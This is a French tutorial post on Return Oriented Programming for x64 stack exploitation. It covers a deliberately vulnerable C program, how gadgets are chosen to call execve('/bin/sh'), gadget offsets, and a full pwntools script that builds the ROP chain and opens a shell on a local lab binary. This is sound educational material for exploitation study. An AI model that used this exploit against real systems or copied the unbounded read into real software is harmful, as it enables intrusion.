---
title: "Return Oriented Programming"
date: 2026-05-20 12:00:00 +0200
categories: [Cybersécurité, Stack Exploitation x64]
tags: [pwn, mémoire, exploit]
---
#### Return Oriented Programming (ROP)

Le Return Oriented Programming ou plus communément appelé ROP est une technique plus restrictive qui se base sur la création d'une structure composée uniquement de gadgets récupérés dans le binaire et la libc permettant l'exécution de code. Le ROP exploite le même principe qu'un shellcode (assemblage bout à bout de code machine) mais directement récupéré morceau par morceau dans la mémoire, cela s'appelle une ROPchain. Cette technique peut être utilisée dans des cas comme la restriction de system() ou sa surveillance dans la libc, l'exploitation sur un très gros binaire qui ne serait pas linké à la libc ou bien le plus souvent, lorsque la protection NX est activée empêchant ainsi l'exécution de code sur la stack directement.

Voici le code vulnérable qui sera exploité, celui-ci ne change pas car pour démontrer cette technique, un simple Stack Buffer Overflow sera exploité. Cependant il ne faut pas oublier que la méthode ROP est flexible, elle ne dépend pas de failles précises et peut être exploitée tant que l'utilisateur peut contrôler RIP et stocker des gadgets quelque part.

```
#include <stdio.h>
#include <unistd.h>

void vulnerable_function() {
    char buffer[64];
    read(0, buffer, 512);
}

int main() {
    vulnerable_function();
    return 0;
}

```

Comme mentionné précédemment, nous ne passons pas par system() cette fois-ci, nous allons créer notre propre ROPchain de toute pièce, le but de notre ROP va donc être de trouver assez de gadgets permettant l'exécution de la fonction execve('/bin/sh', NULL, NULL) et exit(0).

Pour cela il nous faudra en premier lieu 4 POP :

* pop RAX ; ret (le numéro de syscall de execve)
* pop RDI ; ret (le premier argument "/bin/sh")
* pop RSI ; ret (NULL)
* pop RDX ; ret (NULL)

Ces 4 premières instructions nous permettrons de charger les registres assurant le bon fonctionnement de la fonction execve(). Nous allons ensuite avoir besoin de la string "/bin/sh", cependant si system() n'est pas disponible alors il y'a de très grandes chances que "/bin/sh" ne le soit pas non plus. La méthode la plus simple à ce moment-là est de stocker la chaine "/bin/sh" directement dans la zone .data ou bien .bss
pour cela nous allons avoir besoin d'instructions supplémentaires ainsi qu'ici de l'adresse de départ dans .data car c'est ici que nous stockerons la string.

Voici les instructions nécessaires au stockage et au placement de "/bin/sh" dans .data et RDI :

* pop rax ; ret (déjà obtenu)
* pop rdx ; ret (déjà obtenu mais ici n'importe quel autre registre ferait l'affaire car il doit matcher avec un gadget d'écriture)
* mov [rdx], rax ; ret (comme dit précédemment n'importe quel autre registre ferait l'affaire, faites donc avec ce que vous trouvez et adaptez)
* addr de .data via readelf -S exploit | grep .data : .data             PROGBITS         0000000000404008  00003008 (celle-ci ne change pas car no PIE)

Nous avons désormais tout ce qu'il faut pour appeler execve(), nous allons aussi appeler exit() à la fin afin de fermer proprement le programme, pour cela nous aurons besoin de :

* pop rax ; ret
* pop rdi ; ret
* pop rsi ; ret
* pop rdx ; ret

Un dernier gadget primordial afin de dire au noyau d'exécuter les fonctions chargées dans les registres est syscall, sans lui le noyau n'exécutera jamais les fonctions

Nous pouvons maintenant créer notre ROPchain, nous rappelons ici que nous avons 448 octets après le buffer, ce qui est largement assez pour une ROPchain mais dans un cadre ou l'espace serait moindre, il faudrait peut être trouver des gadgets permettant de sauvegarder de la place tels que :

* pop rsi ; pop rdx ; ret

En trouvant ce genre de gadgets nous n'utilisons que 8 octets pour appeler 16 octets de gadget (hors ret).

Nous récupérons maintenant tous les gadgets via ROPgadget :

* pop rax ; ret : 0x0000000000043c23 : pop rax ; ret
* pop rdi ; ret : 0x000000000002a145 : pop rdi ; ret
* pop rsi ; ret : 0x000000000002baa9 : pop rsi ; ret
* pop rdx ; ret : 0x00000000000e3c8d : pop rdx ; pop rcx ; pop rbx ; ret (ici nous n'avons pas de pop rdx ; ret isolé mais l'état de rcx et rbx n'influenceront pas la ropchain donc le gadget reste très bien utilisable)
* mov qword [rdx], rax , ret : 0x0000000000038b4c : mov qword ptr [rdx], rax ; ret
* syscall : 0x0000000000028505 : syscall

Comme toujours, via le programme de repérage avec cyclic nous trouvons un offset de 72 octets pour atteindre RIP et le contrôler, il ne reste donc plus qu'à créer notre programme d'exploitation ROP.

Voici l'exploitation finale avec la ropchain afin d'obtenir notre shell, le code sera commenté pour bien comprendre comment sont chargés et utilisés les registres :

```
from pwn import *

exe = ELF('./exploit')
context.binary = exe

p = process(exe.path)

libc_base = 0x00007ffff7db6000 # Adresse de based de la libc
data_addr = 0x0000000000404008 # Adresse de départ de la section .data

pop_rax = libc_base + 0x0000000000043c23 
pop_rdi = libc_base + 0x000000000002a145
pop_rsi = libc_base + 0x000000000002baa9
pop_rdx_rcx_rbx = libc_base + 0x00000000000e3c8d
mov_qword_rdx_rax = libc_base + 0x0000000000038b4c
syscall = libc_base + 0x0000000000028505

padding = b'A' * 72

ropchain = p64(pop_rdx_rcx_rbx)
ropchain += p64(data_addr)  # rdx = adresse où écrire /bin/sh
ropchain += p64(0)          # rcx = 0
ropchain += p64(0)          # rbx = 0
ropchain += p64(pop_rax)
ropchain += b"/bin/sh\x00"  # On met /bin/sh dans rax
ropchain += p64(mov_qword_rdx_rax) # On écrit /bin/sh à l'adresse data_addr
ropchain += p64(pop_rdi)
ropchain += p64(data_addr)  # rdi = adresse de /bin/sh
ropchain += p64(pop_rsi)
ropchain += p64(0)         # rsi = 0
ropchain += p64(pop_rdx_rcx_rbx)
ropchain += p64(0)         # rdx = 0
ropchain += p64(0)         # rcx = 0
ropchain += p64(0)         # rbx = 0
ropchain += p64(pop_rax)
ropchain += p64(59)        # rax = 59 (sys_execve)
ropchain += p64(syscall)   # On appelle le syscall

ropchain += p64(pop_rdx_rcx_rbx)
ropchain += p64(0)         # rdx = 0
ropchain += p64(0)         # rcx = 0
ropchain += p64(0)         # rbx = 0
ropchain += p64(pop_rax)
ropchain += p64(60)        # rax = 60 (sys_exit)
ropchain += p64(syscall)   # On appelle le syscall

payload = padding + ropchain

p.send(payload)

p.interactive()
```
